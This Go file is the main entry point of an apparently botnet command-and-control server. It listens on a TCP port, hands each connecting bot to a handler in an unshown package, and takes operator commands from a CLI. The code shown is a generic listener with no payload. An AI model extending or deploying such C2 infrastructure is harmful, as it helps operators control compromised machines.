package main

import (
	"fmt"
	"net"
	"os"
	
	"c2/bot"
	"c2/cli"
	"c2/config"
)

func main() {
	// 初始化配置
	config.Init()
	
	// 显示启动横幅
	cli.ShowBanner()
	
	// 启动C2服务器监听
	go startC2Server()
	
	// 处理用户命令输入
	cli.HandleUserInput()
}

func startC2Server() {
	listener, err := net.Listen("tcp", config.ServerPort)
	if err != nil {
		fmt.Println("C2 server startup failed:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("\n[+] C2 server listening on 0.0.0.0%s\n", config.ServerPort)
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Connection error:", err)
			continue
		}
		go bot.HandleNewBot(conn)
	}
}